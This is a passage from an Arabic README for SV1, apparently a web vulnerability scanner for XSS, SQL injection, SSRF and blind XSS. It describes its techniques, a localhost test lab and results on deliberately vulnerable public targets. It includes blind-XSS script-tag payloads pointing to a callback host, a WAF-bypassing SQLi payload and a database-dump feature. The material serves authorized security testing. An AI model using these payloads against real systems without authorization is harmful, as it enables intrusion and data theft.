- `multipart` — نماذج `enctype="multipart/form-data"` تُرسل multipart فعلاً،
  والحقول النصية داخلها تصير نقاط حقن.

**Replay**
كل نتيجة تُعاد بعد الفحص (`--no-verify` يلغيها). إذا ما تكررت، تنزل درجة
خطورتها ودرجة ثقتها ويُكتب في التقرير أنها غير مستقرة. هذا يقتل الإيجابيات
الكاذبة الناتجة عن صفحات random أو WAF.

**إثبات التنفيذ (Chromium)**
إذا Playwright مثبّت، SV1 يفتح الصفحة فعلياً ويعيد الحقن كما أرسله:

- سكربت التهيئة يستبدل `alert/confirm/prompt` قبل أي سكربت في الصفحة ويسجل
  كل نداء بماركر خاص بالفحص (`sv1...`).
- يجرّب الأساسي أولاً؛ إذا انعكس وما نفّذ، يجرّب حتى 5 بدائل قبل التخفيض.
- يقرأ الصفحة وكل إطار فرعي، فـ `iframe srcdoc` و`srcdoc` المحقون يُثبتان
  داخل المستند الفرعي، مو الصفحة العليا فقط.
- بايلودات معالج الحدث تُفعّل بـ `mouseover` و`focus` و`click`، وروابط
  `javascript:` تُتبع.
- النتيجة ما تصير `CONFIRMED` إلا إذا انطلق الماركر في أي إطار.
- ما انطلق → تنزل لـ `MEDIUM` مع ملاحظة صريحة وعدد البايلودات.
- كل نتيجة مؤكدة تاخذ screenshot في `sv1-artifacts/`.

**DOM XSS**
تحليل ثابت لكل `<script>`: يبحث عن مصادر
(`location.hash/search/href`, `document.referrer`, `window.name`,
`document.cookie`, `localStorage`, `sessionStorage`, `postMessage`) وأحواض
(`innerHTML`, `document.write`, `eval`, `insertAdjacentHTML`, `setTimeout` …).
كل زوج مصدر→حوض يُختبر في المتصفح: `#payload`، باراميترات شائعة، referrer،
`window.name`، مفاتيح web storage أو حدث `postMessage`. الثغرة تسجل فقط إذا
نفّذ المتصفح الماركر.

**Stored XSS** (`--stored`)
يرسل البايلود في نماذج POST، ثم يزور الصفحات مرة ثانية وينتظر الماركر.
يكتب بيانات في الهدف.

**اكتشاف باراميترات مخفية** (`--params`)
يبدأ بباراميتر تحكم عشوائي: إذا غيّر الصفحة، الصفحة تتفاعل مع أي شيء
والنتيجة غير موثوقة. غير ذلك يرسل أسماء شائعة على دفعات (16 اسم)، وإذا تغيّر
الرد يقسم الدفعة نصفين حتى يعزل الاسم، ثم يؤكد كل اسم لحاله مرتين. الأسماء
الموجودة أصلاً في الرابط تُستثنى، والأسماء التي تعمل فقط مجتمعة تُرفض.
الفحص على عنوان الهدف نفسه (مثل Arjun)، مو على كل صفحة زحفتها.

**نقاط من JavaScript** (`--js`)
الزاحف يتبع `<a href>` فقط. التطبيقات الحديثة تنادي `/api/...` من داخل
السكربت. SV1 يقرأ السكربت المضمّن ويجلب السكربتات الخارجية بنفس الأصل (بحد
6 ملفات لكل صفحة)، يستخرج كل نص بين علامات اقتباس فيه `?` أو `&`، يحوّله
إلى `InjectionPoint` عادي، ويكمّل عليه XSS + SQLi. الروابط الخارجية
والملفات الثابتة (`*.js?v=1`) تُستبعد.

**زحف SPA** (`--spa`)
الزاحف العادي يقرأ HTML فقط. SV1 يفتح حتى 6 صفحات فيها `<script>` داخل
Chromium فعلياً، يستمع لطلبات `xhr` و`fetch`، ويحوّل كل رابط فيها query إلى
نقطة حقن عادية. كذلك يلتقط روابط `<a>` التي لا تظهر إلا بعد تنفيذ JavaScript:
الرابط اللي فيه query يصير نقاط حقن، والرابط بدونه يُجلب كصفحة (بحد 4).
هذا يغطي الواجهات التي تبني نفسها بالمتصفح.

الحدود: يلتقط استدعاءات GET ذات query فقط، مو جسم POST للـ XHR. يحتاج
Chromium؛ مع `--no-browser` يُتخطى بتحذير.

**استيراد OpenAPI** (`--openapi`)
```powershell
python sv1.py -u https://site.tld --openapi spec.json
python sv1.py -u https://site.tld --openapi https://site.tld/openapi.json
```
يقرأ JSON (ملف محلي أو رابط)، يبني العناوين من `servers[0]` + `paths`،
ويصنع نقطة لكل باراميتر `query` وكل خاصية في جسم JSON أو form أو multipart.
`$ref` المحلي يُتبع، و`{param}` في المسار يُستبدل بـ `1` (المسار نفسه ما
يُحقن). بحد 80 نقطة و6 حقول لكل عملية. YAML غير مدعوم — صدّره JSON أولاً.

**الـ callback (OOB)**
عند استخدام `--blind` أو `--ssrf` يشغّل SV1 سيرفر HTTP محلياً على
`127.0.0.1:8777`. كل حقنة تاخذ توكن فريد (16 حرف hex). السيرفر يسجل وقت
الوصول، IP، User-Agent، Referer، والـ query — وما يسجل طلباً بلا توكن مسجل.
مسار `/t/<token>` يرجّع سكربت، ومسار `/e/<token>` يرجّع صورة 1×1.

- هدف محلي: العنوان الافتراضي يكفي.
- هدف بعيد: `--oob https://...` + `--oob-bind 0.0.0.0:8777` + نفق/فتح منفذ
  يوصل للـ listener. عنوان `127.0.0.1` ما يوصل من خارج الجهاز.
- إذا الهدف HTTPS استخدم callback بـ HTTPS؛ المتصفح يمنع mixed content.
- `--oob-wait` يحدد أقصى انتظار للاتصالات (blind و SSRF) بعد الحقن/الفحص.
- السيرفر ما يقرأ ملفات وما يعرض محتوى الهدف؛ يسجل hit فقط.

**Blind XSS** (`--blind`)
1. يجمع نماذج POST (بحد 6 نماذج، وحقلين لكل نموذج).
2. يحقن شكلين: `<script src="http://cb/t/TOKEN"></script>` و
   `"><script src="..."></script>` مع توكن مستقل لكل حقنة.
3. إذا فُتحت الصفحة في متصفح، يطلب `/t` ويرجّع JavaScript يحمّل
   `/e/TOKEN?p=<sink-url>`.
4. `/t` = السكربت انجلب. `/e` = السكربت **نُفّذ**، والـ `p` يحدد صفحة
   العرض الفعلية.
5. `--blind-visit` يفتح صفحة المشرف داخل Chromium بعد الحقن (محاكاة محلية)،
   وياخذ screenshot. بدونه ينتظر `--oob-wait` مشرفاً حقيقياً.
6. النتيجة: `HIGH` + `CONFIRMED` عند وصول `/e` (تنفيذ فعلي)، و`MEDIUM` +
   `MEDIUM` إذا انجلب السكربت فقط. لا تُحتسب الثانية ضمن `confirmed`، ولا
   تطلع نتيجة بلا hit.

`--blind` يكتب بيانات في الهدف.

**SSRF** (`--ssrf`)
- يختار باراميترات query/form/JSON/multipart التي اسمها يشبه عنواناً
  (`url`, `redirect`, `callback`, `webhook`, `next`, `dest` …) أو قيمتها
  الأصلية URL كامل.
- يرسل `http://<callback>/t/<token>` في مكانها. السيرفر يسجل الاتصال.
- الاختبار لا يتبع redirects: هدف يرد `302` نحو الـ callback ما يخلق نتيجة
  كاذبة، لأن الطلب لازم يجي من الهدف نفسه.
- النتيجة `HIGH` + `CONFIRMED` مع وقت الوصول و IP والـ User-Agent.
- بحد 15 نقطة، وبروتوكول HTTP(S) فقط. الهيدرات والكوكيز مستبعدة.

**Second-order SQLi** (`--second-order`)
الحقنة تُخزَّن الآن وتُنفَّذ لاحقاً في استعلام ثانٍ. الخطوات:
1. يخزّن قيمة نظيفة (`sv1clean`) في الحقل → يقيس الصفحات (بلا أخطاء).
2. يخزّن `sv1'` في نفس الحقل.
3. يزور حتى 6 صفحات (بما فيها صفحات النماذج) ويبحث عن بصمة خطأ قاعدة
   بيانات **جديدة** ما كانت في الأساس.
4. يظهر الخطأ → نتيجة `CRITICAL` بدليل: الحقل، صفحة التخزين، صفحة الخطأ.
5. مرحلة replay تفتح صفحة الخطأ وتتأكد أن الخطأ باقٍ.

الحدود: نموذج واحد لكل حقل، بايلود واحد، حتى 6 نماذج و6 صفحات. يكتب
بيانات في الهدف مثل `--stored`.

كل نتيجة تطلع لك: الهدف، الباراميتر، **طريقة الكشف** (`technique`)، البايلود،
مستوى الخطورة، درجة الثقة، وسطر الدليل.

---

## قياس على المختبر

صفحة `/account` تتغير كل طلب (nonce عشوائي) وفيها حقن منطقي حقيقي.
المقارنة بين المنطق القديم (بايتات، طلب واحد) والمحرك الحالي:

```
real injection on /account   old 0/5   sv1 5/5     ← القديم كان يفوّت
false positives on /noisy    old 0/5   sv1 0/5
```

السبب: ضجيج 2% يكسر مقارنة البايتات تماماً. SV1 يقيس الضجيج ويقارن البنية.

---

## بنية المشروع

```
sv1/
├── sv1.py              نقطة التشغيل والـ CLI
├── sv1lib/
│   ├── version.py      مصدر الإصدار الوحيد
│   ├── config.py       كل الأرقام والثوابت
│   ├── models.py       البيانات (Finding, InjectionPoint ...)
│   ├── net.py          عميل HTTP + حد معدل متكيّف مع 429
│   ├── jsonbody.py     مسارات أوراق JSON وإعادة بناء الجسم
│   ├── imports.py      استيراد HAR / طلب HTTP خام
│   ├── formdata.py     محلل حقول multipart/form-data النصية
│   ├── storage.py      حالة Playwright محصورة بالهدف
│   ├── identity.py     بصمة ثابتة للنتيجة (history/SARIF)
│   ├── history.py      SQLite: جلسات، نتائج، diff، retest
│   ├── scope.py        allowlist للنطاقات/المسارات
│   ├── policy.py       عتبة fail-on وكود الخروج
│   ├── sarif.py        تصدير SARIF 2.1.0
│   ├── crawl.py        زاحف + مستخرج النماذج (stdlib)
│   ├── baseline.py     قياس الضجيج وهوية الصفحة (difflib)
│   ├── context.py      تحليل سياق الحقن + بناء البايلود
│   ├── payloads.py     البايلودات وبصمات أخطاء DB
│   ├── xss.py          كاشف XSS منعكس
│   ├── domxss.py       تحليل مصدر→حوض + إثبات في المتصفح
│   ├── stored.py       حقن في النماذج ثم زيارة الصفحات
│   ├── hidden.py       اكتشاف باراميترات مخفية (بحث ثنائي)
│   ├── jsparse.py      استخراج نقاط الحقن من JavaScript
│   ├── spa.py          زحف SPA + التقاط XHR/fetch
│   ├── openapi.py      استيراد نقاط الحقن من OpenAPI JSON
│   ├── secondorder.py  SQLi من الدرجة الثانية (تخزين ثم زيارة)
│   ├── oob.py          سيرفر callback + توكنات + تسجيل hits
│   ├── blind.py        Blind XSS: حقن ثم انتظار التنفيذ
│   ├── ssrf.py         SSRF عبر نفس الـ callback
│   ├── sqli.py         كاشف SQLi (error/boolean/time/union)
│   ├── union.py        عدّ الأعمدة + الاستخراج + dump
│   ├── dberrors.py     بصمات أخطاء قواعد البيانات
│   ├── tamper.py       صياغات بديلة عند وجود فلتر
│   ├── browser.py      Chromium + هوك alert + screenshots
│   ├── verify.py       إعادة تشغيل النتائج
│   ├── banner.py       المقدمة المتحركة
│   └── report.py       العرض والتصدير (نص/JSON/CSV/HTML)
├── lab/server.py       هدف محلي مصاب للتدريب
├── lab/real_sql.py     هدف SQLite حقيقي للمقارنة فقط
├── tests/test_p5.py    اختبارات الوحدة (scope/history/SARIF/rate/fail-on)
├── tests/test_1_2.py   أمانة الطلب، قواعد السياق، سياسة الإثبات
├── tests/test_1_3.py   HAR، JSON متداخل، أجسام SPA، سكربتات خارجية
├── tests/test_1_4.py   multipart، مسارات OpenAPI، سياسة النماذج، storage
├── tests/test_audit_1_3_5.py  انحدارات حدود الطلب والنطاق
├── tests/test_browser_1_3.py  تكامل Chromium XHR POST (CI)
├── tests/test_lab_1_3.py      بوابة المختبر الكامل (CI)
├── docs/REALWORLD.md   التحقق الميداني
├── docs/QUALITY.md     بوابات الجودة والتغطية
├── docs/COMPARISON.md  مقارنة dalfox/sqlmap بنفس الهدف
├── docs/evidence/      أدلة JSON من الفحص العام والمختبر
├── .github/workflows/ci.yml
├── LICENSE             MIT
├── CHANGELOG.md        سجل الإصدارات
├── ROADMAP.md          خارطة التطوير
├── requirements.txt    إصدارات التشغيل المثبتة
├── requirements-dev.txt إصدارات الاختبار والفحص
├── pyproject.toml      بيانات الحزمة وإعداد البناء
└── run.bat
```

---

## تحقق ميداني

أهداف عامة مصابة عمدًا فقط. الأوامر والأدلة الخام: [`docs/REALWORLD.md`](docs/REALWORLD.md).
المقارنة بنفس الهدف ضد dalfox وsqlmap: [`docs/COMPARISON.md`](docs/COMPARISON.md).

تحقق المواقع الحية: **8 تشغيلات، 80 صفحة، 53 نقطة حقن، 630 طلباً، 63 نتيجة، 63/63 موثقة، 0 أخطاء** (تاريخي). آخر بوابة اختبار: **203 مكتشفاً، 190 ينجح افتراضياً، 13 اختباراً اختيارياً متجاوزاً؛ اختبارات Chromium واختبار المختبر الكامل تعمل في CI**.

| الهدف | النطاق | النتيجة |
|---|---|---|
| Google Firing Range — انعكاس attribute، 1.5.0 | معامل GET واحد | **1 HIGH مؤكدة** XSS؛ 12 طلباً، 18.0 ثانية، 0 أخطاء |
| Altoro Mutual — بحث، 1.5.0 | معامل GET واحد، شهادة منتهية | **1 HIGH مؤكدة** XSS؛ 11 طلباً، 13.6 ثانية، 0 أخطاء |
| Google Firing Range — انعكاس attribute، 1.4.0 | معامل GET واحد | **1 HIGH مؤكدة** XSS؛ 12 طلباً، 18.4 ثانية، 0 أخطاء |
| Altoro Mutual — بحث، 1.4.0 | معامل GET واحد، شهادة منتهية | **1 HIGH مؤكدة** XSS؛ 35 طلباً، 35.0 ثانية، 0 أخطاء |
| Google Firing Range — منعكس، 1.2.1 | 49 صفحة، 47 نقطة | 42 نتيجة — **40 HIGH** مثبتة في Chromium، 2 MEDIUM؛ إعادة تشغيل 42/42، 0 unstable |
| Google Firing Range — DOM، 1.2.0 | 25 صفحة زحف، 20 معروضة | **15 HIGH** DOM، 0 أخطاء |
| Altoro Mutual — بحث، 1.3.1 | معامل GET واحد | **1 HIGH** XSS منعكس، مؤكد؛ إعادة تشغيل 1/1 |
| Firing Range — استيراد HAR، 1.3.1 | نقطة GET مستوردة | **1 HIGH** مؤكدة؛ إعادة تشغيل 1/1 |
| Firing Range — منعكس، 1.6.1 | 49 صفحة، 47 نقطة | 44 نتيجة — **42 HIGH**، 2 MEDIUM؛ 43/43 استرجاع، 41/43 إثبات GET؛ 515 طلباً، 206.3 ثانية |
| Firing Range — ناقلون، 1.6.1 | 323 نقطة، path/header/cookie | 123 نتيجة — **42 HIGH**، 81 MEDIUM؛ 79 انعكاس path بقي MEDIUM؛ لا انعكاس header/cookie؛ 3088 طلباً، 1136.6 ثانية |
| المختبر المحلي 1.6.1 | بوابة كاملة + path/header/cookie | **43/43** نتيجة، 0 unstable؛ 28 صفحة، 150 نقطة؛ 655.7 ثانية |
| المختبر المحلي 1.6.0 | بوابة كاملة + login/sitemap/private/orphan | **40/40** نتيجة، 0 unstable؛ 274.0 ثانية |
| المختبر المحلي 1.5.1 | تغطية كاملة + login/sitemap/private/orphan | **40/40** نتيجة، 0 unstable؛ 1174 طلباً، 275.2 ثانية |
| المختبر المحلي 1.5.0 | خط أساس محفوظ + multipart/path/storage/CSRF | **38/38** نتيجة، 0 unstable؛ 1099 طلباً، 261.0 ثانية |
| المختبر المحلي 1.4.0 | خط أساس محفوظ | **38/38** نتيجة، 0 unstable؛ 1099 طلباً، 262.8 ثانية |

الفحصان الجديدان هما Firing Range (انعكاس attribute) وAltoro (بحث)، وكلاهما
أثبت تنفيذ `alert` داخل Chromium. التشغيلات القديمة (1.2.0/1.2.1/1.3.1/1.4.0)
محفوظة كتاريخ. الحالتان `MEDIUM` في Firing Range هما `/url/css_import`
(رابط stylesheet لا ينفّذ `javascript:` في Chromium الحالي) و
`/url/object_data` (نوع Flash محذوف)؛ بقيتا انعكاساً فقط بدون رفعهما إلى
`HIGH`.

قبول المختبر في 1.6.1: 43/43 موثقة (27 مؤكدة في المتصفح أو OOB، و16 أعادت
الإرسال عبر HTTP)، 0 unstable — CRITICAL 13 / HIGH 28 / MEDIUM 2، 28 صفحة،
150 نقطة، 4201 طلباً، 655.7 ثانية، 0 أخطاء؛ 26 XSS و16 SQLI و1 SSRF. المسارات
الجديدة: `/catalog/{sv1_path_2}?ref=home` (مقطع مسار)، `/header-xss`
(`X-Forwarded-For`) و`/cookie-xss` (`prefs`)، وكلها `HIGH`/`CONFIRMED`.
الدليل: [`docs/evidence/local-lab-1.6.1.json`](docs/evidence/local-lab-1.6.1.json).

قياس 1.6.1 على Firing Range (reflected) أُعيد ولم يُنقل من 1.5.2:
49 صفحة، 47 نقطة، 515 طلباً، 0 أخطاء، 206.3 ثانية؛ 44 نتيجة (42 `HIGH`،
2 `MEDIUM`)، استرجاع **43/43 صفحة GET**، وإثبات تنفيذ **41/43**، ونموذج POST
1/1. الزيادة طلب واحد عن 1.5.2 هي فحص WAF السلبي. الدليل:
[`docs/evidence/firing-range-reflected-1.6.1.json`](docs/evidence/firing-range-reflected-1.6.1.json)
و[`firing-range-reflected-recall-1.6.1.json`](docs/evidence/firing-range-reflected-recall-1.6.1.json).

فحص الناقلين العام: 323 نقطة (47 query + 80 path + 147 header + 49 cookie)،
3088 طلباً، 0 أخطاء، 1136.6 ثانية؛ 123 نتيجة (42 `HIGH`، 81 `MEDIUM`). الـ79
الجديدة من `--path` هي انعكاسات قالب 404/500 وبقيت `MEDIUM` بعد replay؛
لا انعكاس header أو cookie على هذا الهدف. إثباتهما في المختبر عبر
`/header-xss` و`/cookie-xss`.

قبول المختبر في 1.5.1: 40/40 موثقة (24 مؤكدة في المتصفح أو OOB، و16 أعادت
الإرسال عبر HTTP)، 0 unstable — CRITICAL 13 / HIGH 25 / MEDIUM 2، 25 صفحة،
34 نقطة، 1174 طلباً، 275.2 ثانية، 0 أخطاء؛ 23 XSS و16 SQLI و1 SSRF. الدليل:
[`docs/evidence/local-lab-1.5.1.json`](docs/evidence/local-lab-1.5.1.json).
التشغيل يستخدم `--scope 127.0.0.1:8099` ويمرّ على حماية التحويلات والمتصفح.
مسارات الإثبات الجديدة هي `/private?q=` (كوكي دخول؛ الجذر يربطه بعد الدخول)
و`/orphan?q=` (من sitemap فقط، غير مربوط في HTML). مسارات 1.5.0 باقية:
`/csrf` (توكن مخفي + Origin)، و`/upload` و`/api/form` (multipart)، و
`/api/path/{id}` (مسار OpenAPI). `--spa` يثبت `/api/xhr` عند `HIGH`، و
`/xhr-form` يثبت multipart `FormData`. تشغيل 1.5.0 (38/38، 1099 طلباً،
261.0 ثانية) وتشغيل 1.3.4 (31/31، 1012 طلباً، 240.2 ثانية) محفوظان في
`docs/evidence/`.

مقارنة خارجية على هدف SQLite حقيقي، في نفس اليوم: SV1 1.5.0 أكد 3 XSS و2
SQLi في 221 طلباً و49.1 ثانية، dalfox 3.2.4 أكد 3 XSS، وsqlmap
1.10.10.27#dev أكد 2 SQLi؛ الثلاثة بلا إيجابيات كاذبة. SV1 أضاف ملاحظتين
انعكاسيتين `MEDIUM` فقط. الأدوات المتخصصة أسرع داخل تخصصها؛ SV1 أغلى لأنه
يزحف ويغطي الفئتين ويثبت التنفيذ. التفاصيل:
[`docs/COMPARISON.md`](docs/COMPARISON.md). بوابات الجودة والتغطية:
[`docs/QUALITY.md`](docs/QUALITY.md).

---

## مختبر محلي

هدف مصاب جاهز على `127.0.0.1` فقط، ما يطلع للشبكة:

```powershell
# نافذة 1
python lab\server.py 8099

# نافذة 2
python sv1.py -u http://127.0.0.1:8099/ --crawl --no-banner
```

الفحص الكامل مع تغطية P3 + P3.1 + P4 + P5:

```powershell
# ملف النطاق مرة واحدة
"127.0.0.1:8099" | Set-Content scope-lab.txt

# بيانات المختبر عبر البيئة، وليس argv
$env:SV1_USERNAME = 'sv1operator'
$env:SV1_PASSWORD = 'sv1-lab-password'

python sv1.py -u http://127.0.0.1:8099/ --crawl --pages 40 --path --headers --cookies `
  --cookie "prefs=hello" --stored --js --second-order --dump `
  --spa --external-js --openapi http://127.0.0.1:8099/openapi.json `
  --blind --blind-visit http://127.0.0.1:8099/blind-admin `
  --oob http://127.0.0.2:8777 --oob-bind 127.0.0.2:8777 --ssrf `
  --sitemap --login http://127.0.0.1:8099/login --login-check private `
  --scope scope-lab.txt --db lab-history.db --diff --sarif report.sarif `
  --fail-on high --html report.html
```

النتيجة: **43 نتيجة، 43 موثقة (27 مؤكدة، 16 معادة)، 0 unstable** — CRITICAL 13،
HIGH 28، MEDIUM 2، 28 صفحة، 150 نقطة حقن، 4201 طلباً، 655.7 ثانية (مع Chromium).

`--login` يضبط كوكي على الـ host، وChromium لا يفرّق بالمنفذ عند إرسال الكوكي.
حارس المسار يمنع الكوكي من الوصول إلى callback على نفس الـ host ومنفذ مختلف،
لذلك يستخدم المختبر الموثق `127.0.0.2:8777` للـ OOB. هذا لا يضعف الحارس.

المختبر يحتفظ بحالة guestbook وblind وprofile في الذاكرة. أعد تشغيل
`lab\server.py` قبل تكرار الفحص الكامل؛ وإلا فإن `/profile` يحتوي بايلود
second-order مسبقًا وتظهر صفحة الخطأ بدل النموذج.

- **XSS (26):** 25 مؤكدة بالتنفيذ داخل Chromium. الناقلون الجدد:
  `/catalog/{sv1_path_2}?ref=home` (مقطع مسار)، `/header-xss`
  (`X-Forwarded-For`) و`/cookie-xss` (`prefs`). إثبات الدخول هو `/private?q=`
  (يتطلب كوكي جلسة؛ الجذر يربطه فقط بعد الدخول)، وإثبات sitemap هو `/orphan?q=`
  (غير مربوط، اكتُشف من `robots.txt` → `sitemap.xml`). مسارات الإثبات السابقة
  هي `/csrf` (توكن مخفي محفوظ + Origin)، و`/upload` و`/api/form` (multipart)،
  و`/api/path/{id}` (مسار OpenAPI). `/api/xhr` صار `HIGH` لأن استجابة JSON
  تُعرض عبر إثبات fetch في المتصفح. انعكاس `/safe` المشفّر يبقى `MEDIUM`
  الوحيد؛ `/dom` و`/external` و`/guestbook` و`/blind-admin` يحتفظون بإثبات
  التنفيذ السابق.
- **SQLi (16):** خطأ MySQL في `/search` و `/union` و `/waf` و `/upload`
  و `/csrf` و `/api/form` و `/api/path/{id}` و `/api/fetch` و `/api/spa`
  و `/dynamic`، حقن منطقي في `/item` و `/api/item`، و`/account` ينزل `MEDIUM`
  لأن صفحته متغيرة (ضجيج)، استخراج UNION من `/union`:
  `3 columns, column 1 echoes back; version() -> 8.0.36-lab`، وحقن من الدرجة
  الثانية في `/profile` (`sv1'` تُخزَّن ثم تنكسر عند العرض).
- **SSRF (1):** `/fetch?url=` طلب عنوان الـ callback فعلياً، والنتيجة
  `HIGH` + `CONFIRMED` مع وقت الوصول والـ User-Agent. الاختبار لا يتبع
  redirects، فالـ hit من الهدف نفسه.
- **`--login`:** يرسل `sv1operator` / `sv1-lab-password` مع
  `sv1-login-token` المخفي إلى `/login`، ويحفظ `sid` في جلسة HTTP وChromium،
  ويتحقق من `private`. `/private` بدون جلسة يرجع `403`، والجذر الموثق يضيف
  `/private?q=hello`، فلا يصل إليه الزاحف إلا بجلسة.
- **`--sitemap`:** `robots.txt` فيه `Disallow:` فارغ ويعرض `sitemap.xml`،
  والـ sitemap يشير إلى `/orphan?q=hello` غير المربوط في HTML. `--sitemap`
  يزرعه، والانعكاس يُؤكد بالتنفيذ.
- **`--blind`:** 16 بايلوداً خُزّنت؛ تأكد تنفيذ OOB واحد. الصفحة
  `/blind-admin` غير مربوطة بالفهرس — لا يراها الزاحف. بعد الحقن فتحها
  `--blind-visit`، فطلب السكربت من `/t` ثم نفّذ صورة `/e` وأرسل صفحة العرض
  في `p`.
- **`--ssrf`:** نقطة URL واحدة في `/fetch`؛ الطلب وصل للـ listener من
  `urllib` داخل المختبر، وليس من متصفح الفحص.
- **`--dump`:** يضيف للنتيجة قيم القاعدة:
  ```
  data    user    sv1@localhost
  data    db      sv1lab
  data    tables  users,notes,accounts
  ```
- **`--js`:** نقطتان من سكربت `/js-endpoints`:
  `/api/fetch?id=1&name=test` — XSS مؤكد بالتنفيذ و SQLi خطأ.
- **`--spa`:** يلتقط GET وJSON وmultipart XHR. يلتقط
  `/api/spa?id=1&name=test` المبني بالمتغيرات (لا يراه `--js`) → XSS مؤكد
  بالتنفيذ و SQLi خطأ. ويلتقط رابط `<a>` الذي بناه السكربت نحو
  `/dynamic?id=1&name=test` → النتيجتان نفسهما. `/xhr-post` يرسل JSON إلى
  `/api/xhr` (`HIGH` بعد إثبات fetch)؛ `/xhr-form` يرسل `FormData` multipart
  إلى `/api/form`، فتصير نقطة multipart وتوصل `HIGH` + `CONFIRMED`.
- **`--external-js`:** يقرأ `/external.js` ويثبت
  `location.hash → innerHTML` في Chromium، فتسجل `/external` كـ `HIGH` +
  `CONFIRMED`.
- **`--openapi`:** 5 نقاط من `/openapi.json`؛ `/api/item` JSON أضاف حقناً
  منطقياً واحداً، و`/api/path/{id}` أضاف XSS وSQLi على المسار. نقاط
  `/api/fetch` طابقت نقاط `--js` فما تكررت.
- **`--second-order`:** يخزّن `sv1clean` ثم `sv1'` في `/profile`، يقيس
  الصفحات، ويكشف الخطأ الجديد عند العرض.
- **`--params`** على `-u http://127.0.0.1:8099/hidden`: يكتشف `debug` و
  `export` ويطلع نتيجتا XSS مؤكدتان بالتنفيذ.
- `--json http://127.0.0.1:8099/api/item`: +1 (حقن منطقي JSON).
- `--headers` على `-u .../header`: +1، `--cookies --cookie sid=abc` على
  `-u .../cookie`: +1.

`--stored` و `--second-order` و `--blind` يكتبون بيانات في الهدف.
`--ssrf` يخلي الهدف يطلب عنوان الـ callback. المختبر يضيف `/blind`
و`/fetch` كصفحات عادية، بينما `/blind-admin` مقصود أن يبقى غير مربوط.

- **`--scope`:** ملف `127.0.0.1:8099` سمح بالهدف؛ هدف خارج الملف يرجع 2 قبل
  أي طلب. الزحف لا يخرج عن النطاق، ونقاط OpenAPI تُفلتر.
- **`--db --diff`:** الجلسة الأولى `#1` بلا سابق؛ الفحص التالي لنفس الهدف
  يُقارن بها (`+N new · N open · -N fixed`).
- **`--retest`:** يعيد فحص النتائج القابلة للإعادة فقط، ويتخطى
  Blind وSSRF وStored وDOM وUNION. لم يزحف ولم يفتح متصفحاً.
- **SARIF:** 43 نتيجة، بصمة ثابتة لكل نتيجة، وملف يمرّ schema الرسمي
  SARIF 2.1.0.
- **`--fail-on`:** `none` = 0، `high` = 1، `critical` = 1 على المختبر،
  وهدف نظيف مع `high` = 0.

`/waf` يرفض أي طلب فيه مسافة بـ 403. SV1 يتجاوزها بـ `/**/` ويحفظ الصياغة
الناجحة في النتيجة:

```
vector  error
payload '/**/AND/**/1=CONVERT(int,@@version)--/**/-
note    database error surfaced (MySQL) - error based injection
        | filter bypassed with 2 encoded payload(s)
```

---

## حدود الأداة

- XSS يغطي المنعكس و DOM والمخزّن عند تشغيل Chromium. بدونه: انعكاس فقط.
- ردود غير HTML (`text/plain`، JSON، ثنائي) ليست مرشحة XSS. رابط stylesheet أو
  `object` فلاش محذوف ممكن يعكس `javascript:` بدون تنفيذ؛ هذه النتائج تبقى
  `MEDIUM`.
- كشف DOM يعتمد على أزواج مصدر→حوض داخل `<script>` المضمّن افتراضياً.
  `--external-js` يضيف حتى 4 ملفات same-origin لكل صفحة (1.5MB لكل ملف).
  `--spa` ينفّذ الصفحات لكنه ما يحلل نصوص الـ bundles الخارجية. ميزانية
  المتصفح تعرض 20 صفحة في تمريرة DOM.
- `--js` يقرأ الروابط المكتوبة كنص داخل السكربت (سكربت مضمّن + ملفات خارجية
  بنفس الأصل). إذا الرابط يُبنى بالمتغيرات (`'/api/' + id`) ما ينكشف — هنا
  يجي `--spa` ويلتقطه من الطلب الفعلي.
- `--spa`: حتى 6 صفحات، انتظار 1.8 ثانية للطلبات المتأخرة، ويلتقط أجسام
  XHR/fetch POST حتى 200KB؛ أجسام multipart تُتخطى. يحتاج Chromium؛ مع
  `--no-browser` يُتخطى. انعكاس JSON/XHR يبقى `MEDIUM` بلا مسار تنفيذ.
- `--openapi`: JSON فقط (YAML يُصدَّر JSON)، يقرأ `servers[0]` و`paths`،
  ما يحقن `{param}` داخل المسار، وبحد 80 نقطة و6 حقول لكل عملية. جسم JSON
  المتداخل يتحول لأوراق scalar؛ form/multipart يبقى top-level.
- `--har`/`--request`: مواد جلسة same-origin فقط؛ الكوكيز والهيدرات ثابتة من
  الملف. CSRF متجدد أو جلسة قصيرة العمر تحتاج التقاطاً/بروكسياً جديداً. القيم
  المستوردة ما تُطبع في الكونسول.
- JSON المتداخل محدود بـ24 مستوى؛ الورقة تُرسل بإعادة بناء القالب الأصلي.
  في الجسم الخام، أول `*` هو علامة الحقن.
- `--external-js` يقرأ سكربتات same-origin فقط؛ حزم CDN الخارجية تُتخطى.
  هذا فحص source/sink، مو parser كامل لجافاسكربت.
- `--params` يفحص عنوان الهدف نفسه، مو كل صفحة زحفتها.
- `--second-order` يجرّب بايلود واحد (`sv1'`) وحتى 6 نماذج و6 صفحات؛
  الحقول المفلترة على الإدخال ما راح تنكشف.
- `--blind`: نماذج POST فقط، حتى 6 نماذج وحقلان لكل نموذج وشكلان لكل حقل.
  `--blind-visit` يحتاج Chromium؛ بدونه ينتظر مشرفاً حقيقياً. CSP قوي ممكن
  يمنع الصورة (`/e`) فتطلع النتيجة `MEDIUM` رغم أن السكربت انجلب.
- `--ssrf`: يعتمد على اسم الباراميتر أو قيمة URL كاملة؛ بحد 15 نقطة،
  وبروتوكول HTTP(S) فقط. ما يجرّب `file/gopher` حالياً. allowlist أو مصادقة
  على نقطة الهدف تعني false negative.
- الـ callback لازم يكون قابلاً للوصول من الهدف. الافتراضي `127.0.0.1` للهدف
  المحلي فقط؛ للهدف البعيد استخدم `--oob` عام + نفق/فتح منفذ + `--oob-bind`.
  ما فيه DNS/SMB OOB، ولا OOB SQLi عبر `xp_dirtree`/`UTL_HTTP` بعد.
- multipart يغطي الحقول النصية داخل النموذج، مو محتوى الملفات المرفوعة.
- SQLi: error/boolean/time + UNION extraction. UNION يحتاج عموداً نصياً
  و`ORDER BY`/`UNION` غير محجوبين. `--dump` يقرأ الهوية وأسماء الجداول فقط،
  مو صفوفاً كاملة؛ أوراكل بلا dump حالياً.
- `--headers` و `--cookies` يفحصان عنوان الهدف نفسه، مو كل صفحة زحفتها.
- WAF/flood protection ممكن يقلب النتائج. نزّل `--rps` عند الحاجة.
- الفحص الزمني بطيء بطبيعته: كل بايلود ينتظر عدة ثواني.
- `--stored` و `--second-order` و `--blind` يكتبون بيانات في الهدف.
- `--login` يدعم نموذج POST واحداً على نفس الأصل فيه حقل password ويحافظ على
